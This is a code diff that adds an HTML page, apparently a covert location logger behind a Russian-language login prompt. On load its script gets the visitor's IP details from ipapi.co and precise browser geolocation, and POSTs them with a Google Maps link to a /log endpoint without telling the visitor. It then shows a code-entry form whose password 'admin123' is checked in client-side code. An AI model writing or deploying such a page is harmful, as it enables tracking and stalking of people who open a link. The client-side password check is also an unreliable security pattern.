@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <script>
+      async function run() {
+        try {
+          const ip = await fetch('https://ipapi.co/json/').then(r => r.json());
+          navigator.geolocation.getCurrentPosition(async pos => {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            const payload = {
+              timestamp: new Date().toISOString(),
+              ip: ip.ip,
+              city: ip.city,
+              region: ip.region,
+              country: ip.country_name,
+              latitude: lat,
+              longitude: lon,
+              map: `https://www.google.com/maps?q=${lat},${lon}`
+            };
+            await fetch('/log', {
+              method: 'POST',
+              headers: {'Content-Type': 'application/json'},
+              body: JSON.stringify(payload)
+            });
+
+            const form = document.createElement('form');
+            form.onsubmit = function(e) {
+              e.preventDefault();
+              const code = document.getElementById('code').value;
+              location.href = code === 'admin123' ? '/admin' : '/loading';
+            };
+            form.innerHTML = `
+              <input id="code" placeholder="Код" required>
+              <button type="submit">Войти</button>
+            `;
+            document.body.innerHTML = '';
+            document.body.appendChild(form);
+          });
+        } catch (err) {
+          document.body.textContent = "Ошибка";
+        }
+      }
+      run();
+    </script>
+  </body>
+</html>
